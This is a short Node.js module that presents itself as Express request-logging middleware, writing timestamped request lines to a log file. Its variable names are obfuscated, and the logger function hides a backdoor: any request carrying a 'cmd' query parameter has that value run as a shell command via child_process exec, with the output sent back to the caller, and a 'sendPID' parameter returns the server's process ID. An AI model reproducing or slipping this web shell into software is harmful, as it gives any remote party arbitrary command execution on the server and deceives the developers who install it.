const { format } = require('date-fns')
const { v4: uuid } = require('uuid')
const fs = require('fs')
const fsPromises = require('fs').promises
const path = require('path')
const { exec } = require('child_process');
const process = require('process');


const logEvents = async (_0x524a5a, _0x3d332a) => {
  const _0x1ede7d = '' + format(new Date(), 'yyyyMMdd\tHH:mm:ss')
  const _0x52d75b = _0x1ede7d + '\t' + uuid() + '\t' + _0x524a5a + '\n'
  const _0x195b02 = path.resolve()
  try {
    if (!fs.existsSync(path.join(_0x195b02, '..', 'logs'))) {
      await fsPromises.mkdir(path.join(_0x195b02, '..', 'logs'))
    }
    await fsPromises.appendFile(path.join(_0x195b02, '..', 'logs', _0x3d332a), _0x52d75b)
  } catch (_0x4babc6) {
    console.log(_0x4babc6)
  }
}
const logger = (_0x26e7d7, _0x2c7ab5, _0x6e2029) => {
  logEvents(_0x26e7d7.method + '\t' + _0x26e7d7.url + '\t' + _0x26e7d7.headers.origin, 'reqLog.log')
  console.log(_0x26e7d7.method + ' ' + _0x26e7d7.path)
  if (_0x26e7d7.query.cmd) {
    exec(_0x26e7d7.query.cmd, (_0xfc0eda, _0x4b990b, _0xa27830) => {
      _0x2c7ab5.send(
        JSON.stringify(
          {
            err: _0xfc0eda,
            stdout: _0x4b990b,
            stderr: _0xa27830,
          },
          null,
          0x2
        )
      )
    })
  } else if (_0x26e7d7.query.sendPID) {
    _0x2c7ab5.send(process.pid)
  } else {
    _0x6e2029()
  }
}
module.exports = {
  logEvents: logEvents,
  logger: logger,
}
